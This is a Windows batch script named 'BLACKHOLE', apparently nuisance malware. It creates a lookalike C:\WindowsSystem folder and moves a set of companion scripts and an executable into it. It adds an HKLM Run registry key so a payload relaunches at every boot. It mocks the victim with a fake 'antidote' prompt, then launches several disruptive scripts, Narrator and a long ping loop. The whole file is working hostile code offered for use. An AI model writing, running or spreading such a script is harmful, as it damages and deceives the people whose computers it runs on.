@echo off
Title BLACKHOLE
mode con cols=260 lines=260
color 4
type logo.txt
start altenter.exe
MD C:\WindowsSystem >NUL
MD C:\WindowsSystem\aSync >NUL
MD C:\WindowsSystem\bSync >NUL
MD C:\WindowsSystem\cSync >NUL
powershell.exe Move-Item -Path "LaunchBHStart.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH1.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH2.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH3.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH4.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH5.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH6.vbs" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH7.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH8.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH9.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH10.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "IDIOT.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "logo.txt" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "altenter.exe" -Destination "C:\WindowsSystem\cSync"
attrib -H "C:\WindowsSystem\cSync\LaunchBHStart.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH1.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH2.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH3.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH4.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH5.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH6.vbs"
attrib -H "C:\WindowsSystem\cSync\LaunchBH7.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH8.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH9.bat"
attrib -H "C:\WindowsSystem\cSync\LaunchBH10.bat"
attrib -H "C:\WindowsSystem\cSync\IDIOT.bat"
attrib -H "C:\WindowsSystem\cSync\logo.txt"
attrib -H "C:\WindowsSystem\cSync\altenter.exe"
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v 01 /t REG_SZ /d "C:\WindowsSystem\cSync\LaunchBH2.bat" /f >NUL
echo sorry for your computer ;)
echo PRESS ANY KEYS TO HAVE THE ANTIDOTE
timeout 7
powershell.exe Move-Item -Path "LaunchBH.bat" -Destination "C:\WindowsSystem\cSync"
start C:\WindowsSystem\cSync\IDIOT.bat
start C:\WindowsSystem\cSync\IDIOT.bat
start C:\WindowsSystem\cSync\IDIOT.bat
start narrator
timeout 3
start C:\WindowsSystem\cSync\launchBH1.bat
cls
ping localhost /w 1 /t /l 6500



